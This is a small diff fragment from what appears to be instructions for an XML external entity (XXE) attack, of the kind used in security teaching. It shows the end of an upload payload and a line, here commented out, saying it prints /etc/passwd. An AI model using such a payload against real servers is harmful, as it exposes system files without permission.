@@ -18,5 +18,5 @@ Upload the following file:
 ]>
 <foo>&xxe;</foo>
 
-It will print contents of /etc/passwd.
+#It will print contents of /etc/passwd.
 
